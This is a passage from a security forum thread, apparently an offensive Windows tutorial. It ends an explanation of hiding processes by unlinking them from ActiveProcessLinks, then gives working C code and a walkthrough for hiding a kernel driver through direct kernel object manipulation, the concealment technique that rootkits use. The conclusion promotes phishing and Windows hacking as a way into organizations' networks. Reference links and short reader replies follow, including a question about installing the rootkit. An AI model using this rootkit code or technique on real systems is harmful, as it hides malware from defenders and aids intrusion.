<li>It iterates through the list of active processes, comparing the PID of each process with the target PID. When it finds a match, it unlinks the process from the <code>ActiveProcessLinks</code> list, effectively hiding it.</li>
<li>The function returns <code>STATUS_SUCCESS</code> if it successfully hides the process. If the target process is not found, it returns <code>STATUS_NOT_FOUND</code>.</li>
</ol>
<h3><a name="hiding-a-driver-32" class="anchor" href="37769.html#hiding-a-driver-32"></a>Hiding a Driver</h3>
<p>In addition to hiding processes, we can also employ the DKOM technique to hide drivers from the system. This is particularly useful in scenarios where a rootkit needs to remain undetected</p>
<pre><code class="lang-c">// Function to hide a driver by manipulating data structures
NTSTATUS HideDriver(PDRIVER_OBJECT driverObject) {
    KIRQL irql;
    
    // Raise IRQL to DPC level
    irql = KeRaiseIrqlToDpcLevel();
    
    // Get the module entry from the DriverObject
    PLDR_DATA_TABLE_ENTRY moduleEntry = (PLDR_DATA_TABLE_ENTRY)driverObject-&gt;DriverSection;
    
    // Unlink the module entry
    moduleEntry-&gt;InLoadOrderLinks.Blink-&gt;Flink = moduleEntry-&gt;InLoadOrderLinks.Flink;
    moduleEntry-&gt;InLoadOrderLinks.Flink-&gt;Blink = moduleEntry-&gt;InLoadOrderLinks.Blink;
    
    // Lower IRQL back to its original value
    KeLowerIrql(irql);
    
    return STATUS_SUCCESS;
}

</code></pre>
<p><code>HideDriver</code> function is designed to hide a driver by manipulating kernel data structures. Here‚Äôs a breakdown of how it works:</p>
<ol>
<li>It raises the IRQL (Interrupt Request Level) to DPC (Deferred Procedure Call) level using <code>KeRaiseIrqlToDpcLevel</code>. This is essential to ensure that the manipulation of kernel data structures is performed atomically and doesn‚Äôt interfere with ongoing system operations.</li>
<li>Next, it obtains the module entry by casting the <code>DriverSection</code> member of the provided <code>driverObject</code> to a <code>PLDR_DATA_TABLE_ENTRY</code>. This provides access to information about the driver module.</li>
<li>It unlinks the module entry from the kernel‚Äôs internal linked lists. By manipulating the <code>InLoadOrderLinks</code> member of the module entry, it effectively removes the driver from the list of loaded modules.</li>
<li>Finally, it lowers the IRQL back to its original value using <code>KeLowerIrql</code>, allowing normal system operation to resume.</li>
</ol>
<h1><a name="conclusion-33" class="anchor" href="37769.html#conclusion-33"></a>Conclusion</h1>
<p>Thank you for reading, and I hope you‚Äôve learned something from this. We‚Äôve covered a lot of topics. I removed the shellcode development section to keep things simpler, which I may cover in a separate article. I‚Äôve included great resources that helped create this article. Remember,</p>
<p>" Social engineering and phishing, combined with some operative knowledge about windows hacking, should be enough to get you inside the networks of most organization"</p>
<h2><a name="references-and-credits-34" class="anchor" href="37769.html#references-and-credits-34"></a>References and Credits</h2>
<p><a href="https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/" rel="noopener nofollow ugc"> Anatomy of the Process Environment Block (PEB) (Windows Internals</a></p>
<p><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland" rel="noopener nofollow ugc">Manipulating Active processlinks</a></p>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection" rel="noopener nofollow ugc"> DLL Injection</a></p>
<p><a href="https://memn0ps.github.io/kernel-mode-rootkits/" rel="noopener nofollow ugc">Kernel Mode Rootkits</a></p>
<p><a href="https://www.ired.team/offensive-security/defense-evasion/finding-all-rwx-protected-memory-regions" rel="noopener nofollow ugc">Enumerating RWX Protected Memory Regions for Code Injection</a></p>
<p><a href="https://www.drmaster.com.tw/Bookinfo.asp?BookID=MP22111" rel="noopener nofollow ugc">Windows APT Warfare</a></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="13" />
<span class="post-likes">13 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../dll-load-proxying/39031.html">DLL-Load Proxying</a>
<meta itemprop="position" content="24">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/c0mrade"><span itemprop="name">c0mrade</span></a>
( Nox)
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-11-08T09:26:27Z" class="post-time">
November 8, 2023, 9:26am
</time>
<meta itemprop="dateModified" content="2023-11-08T09:26:27Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I could download this as a pdf or something</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/messede"><span itemprop="name">messede</span></a>
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-11-08T16:12:25Z" class="post-time">
November 8, 2023, 4:12pm
</time>
<meta itemprop="dateModified" content="2023-11-08T16:12:25Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>another excellent piece.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/cicada"><span itemprop="name">cicada</span></a>
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-11-08T19:03:22Z" class="post-time">
November 8, 2023, 7:03pm
</time>
<meta itemprop="dateModified" content="2023-11-08T19:03:22Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Now THIS is excellent content</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/vict0ni"><span itemprop="name">vict0ni</span></a>
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-11-09T09:05:09Z" class="post-time">
November 9, 2023, 9:05am
</time>
<meta itemprop="dateModified" content="2023-11-09T09:05:09Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>you can do ctrl + P and save the file as a pdf</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ATreeShine"><span itemprop="name">ATreeShine</span></a>
(ATreeShine)
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-11-13T14:05:12Z" class="post-time">
November 13, 2023, 2:05pm
</time>
<meta itemprop="dateModified" content="2023-11-13T14:05:12Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>That‚Äôs amazing, thanks.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Secey"><span itemprop="name">Secey</span></a>
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-11-16T08:16:53Z" class="post-time">
November 16, 2023, 8:16am
</time>
<meta itemprop="dateModified" content="2023-11-16T08:16:53Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This article is impressive,thanks.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/EG1116"><span itemprop="name">EG1116</span></a>
(EG)
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-11-18T16:01:06Z" class="post-time">
November 18, 2023, 4:01pm
</time>
<meta itemprop="dateModified" content="2023-11-18T16:01:06Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks for your thread.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/initfs"><span itemprop="name">initfs</span></a>
(sam)
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2024-03-07T03:16:38Z" class="post-time">
March 7, 2024, 3:16am
</time>
<meta itemprop="dateModified" content="2024-03-07T03:20:05Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This is so dense, so obviously this left me with some questions:</p>
<ol>
<li>How the rootkit its installed, I mean, in linux you have lkm system but on windows what?</li>
<li>The rootkit for windows 7 could be run in windows 10? if not how modify the code to make it compatible? in linux you can explore the code, so you have a very clear picture of what happened in what version but the windows kernel is more obscure</li>
<li>I read from an article about writing rootkits the next thing:</li>
</ol>
<blockquote>
<p>All you need is do is learn assembly and C/C++ programming, plus exploit development, reverse engineering, and Windows internals, and then find and abuse a buggy driver, and inject and install your rootkit, and bam.</p>
</blockquote>
<p><a href="https://www.theregister.com/2020/08/07/def_con_demirkapi/" rel="noopener nofollow ugc">article</a></p>
<p>is this true?</p>
<p>Your content is so advance, I like it so much, but I still feel it like is more about the ‚Äúwhat‚Äù and not the ‚Äúwhy‚Äù, so at the end I just know how to do the things but I do not comprehend it.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="37769.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2024-03-08T18:33:38Z" class="post-time">
March 8, 2024, 6:33pm
</time>
<meta itemprop="dateModified" content="2024-03-08T18:33:38Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
